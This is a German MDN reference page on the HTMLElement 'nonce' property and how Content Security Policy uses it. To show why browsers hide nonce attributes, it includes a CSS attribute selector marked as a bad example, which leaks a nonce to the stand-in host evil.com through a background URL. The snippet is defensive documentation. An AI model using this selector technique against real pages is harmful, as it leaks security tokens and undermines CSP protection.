---
title: "HTMLElement: nonce-Eigenschaft"
short-title: nonce
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: 4d929bb0a021c7130d5a71a4bf505bcb8070378d
---

{{APIRef("HTML DOM")}}

Die **`nonce`**-Eigenschaft der [`HTMLElement`](/de/docs/Web/API/HTMLElement)-Schnittstelle gibt die einmal verwendete kryptografische Nummer zurück, die von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf durchgeführt werden darf.

In späteren Implementierungen geben Elemente ihr `nonce`-Attribut nur für Skripte frei (und nicht für Seitenkanäle wie CSS-Attributselektoren).

## Beispiele

### Abrufen eines `nonce`-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher besteht ein Workaround darin, [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback zu verwenden:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Jedoch verbergen neuere Browserversionen `nonce`-Werte, die auf diese Weise abgerufen werden (es wird eine leere Zeichenkette zurückgegeben). Die IDL-Eigenschaft (`script['nonce']`) wird der einzige Weg sein, um Nonces abzurufen.

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu extrahieren, die Daten von Inhaltsattributen erfassen können, wie beispielsweise diesen CSS-Selektor:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`nonce` globales Attribut](/de/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
